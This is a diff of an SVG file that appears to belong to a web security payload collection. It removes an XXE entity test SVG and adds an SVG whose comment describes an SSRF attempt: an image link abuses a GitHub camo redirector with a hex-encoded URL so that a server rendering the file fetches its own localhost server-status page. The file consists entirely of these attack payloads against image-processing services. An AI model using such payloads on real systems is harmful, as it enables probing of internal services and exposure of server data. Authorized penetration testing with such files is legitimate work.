@@ -1,1 +1,8 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [  <!ENTITY test "XXE_IS_WORKING">]><svg width="300" height="100" xmlns="http://www.w3.org/2000/svg">  <style>    text { font-family: sans-serif; font-size: 20px; }  </style>  <text x="10" y="50">    &test;  </text></svg>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<!-- 
+    This payload attempts an SSRF via an Open Redirect.
+    The camo.githubusercontent.com service was sometimes usable as a redirector.
+    We give it the hex-encoded version of http://localhost/server-status
+  -->
+<image xlink:href="https://camo.githubusercontent.com/687474703a2f2f6c6f63616c686f73742f7365727665722d737461747573" width="200" height="200" />
+</svg>
